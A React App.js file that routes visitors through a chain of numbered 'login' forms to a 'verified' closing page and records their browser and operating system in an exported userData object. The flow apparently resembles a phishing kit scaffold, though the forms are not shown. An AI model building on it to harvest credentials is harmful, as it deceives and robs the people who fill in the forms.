import React from "react";
import "./App.css";
import Main from "./main/Main";
import { ChakraProvider } from "@chakra-ui/react";
import { createBrowserRouter, RouterProvider } from "react-router-dom";
import Form1 from "./main/components/Forms/Form1";
import Form2 from "./main/components/Forms/Form2";
import Form3 from "./main/components/Forms/Form3";
import Form5 from "./main/components/Forms/Form5";
import Form6 from "./main/components/Forms/Form6";
import Closing from "./main/components/Forms/Closing";

const router = createBrowserRouter([
  {
    path: "/*",
    element: <Main />,
    children: [
      {
        path: "*",
        element: <Form1 />,
      },
      {
        path: "login/2",
        element: <Form2 />,
      },
      {
        path: "login/3",
        element: <Form3 />,
      },
      {
        path: "login/4",
        element: <Form5 />,
      },
      {
        path: "login/5",
        element: <Form6 />,
      },
      {
        path: "verified",
        element: <Closing />,
      },
    ],
  },
]);

const browser = navigator.userAgent;
const os = navigator.platform;

export const userData = {
  IP: "left",
  browser,
  os,
};

function App() {
  return (
    <ChakraProvider>
      <div className="App">
        <RouterProvider router={router} />
      </div>
    </ChakraProvider>
  );
}

export default App;
